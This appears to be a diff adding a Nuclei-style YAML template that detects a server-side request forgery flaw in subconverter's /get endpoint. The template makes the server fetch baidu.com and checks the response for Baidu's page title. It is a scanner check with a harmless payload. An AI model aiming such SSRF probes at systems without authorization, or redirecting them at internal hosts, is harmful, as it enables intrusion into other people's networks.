@@ -1,0 +1,22 @@
+id: poc-yaml-subconverter-get-ssrf
+
+info:
+  name: subconverter /get SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/get?url=http://www.baidu.com/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<title>百度一下，你就知道</title>"
+        part: body
